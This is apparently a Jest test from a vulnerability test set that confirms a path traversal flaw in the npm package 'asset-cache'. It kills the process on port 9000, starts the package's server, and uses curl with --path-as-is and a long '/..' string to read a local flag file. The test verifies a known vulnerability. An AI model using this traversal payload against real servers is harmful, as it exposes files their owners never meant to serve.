const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v66 = '/..'.repeat(50);
    const v67 = v66 + pathToFlag;
    return v67;
};
const v81 = done => {
    const v68 = expect.assertions(1);
    v68;
    const pkg = require('asset-cache');
    const fs = require('fs');
    const v69 = require('child_process');
    const exec = v69.exec;
    const v70 = fs.readFileSync(pathToFlag);
    let hostsFile = v70.toString();
    const a = require('child_process');
    try {
        const v71 = () => {
        };
        const v72 = a.execSync('fuser -k 9000/tcp', v71);
        v72;
    } catch (e) {
    }
    const v73 = function () {
    };
    const v74 = pkg.listen(9000, v73);
    v74;
    const v75 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:9000${ v75 }"`;
    const v79 = (error, stdout) => {
        const v76 = expect(stdout);
        const v77 = v76.toBe(hostsFile);
        v77;
        const v78 = done();
        v78;
    };
    const v80 = exec(attack_string, v79);
    v80;
};
const v82 = test('Path Traversal in asset-cache', v81);
v82;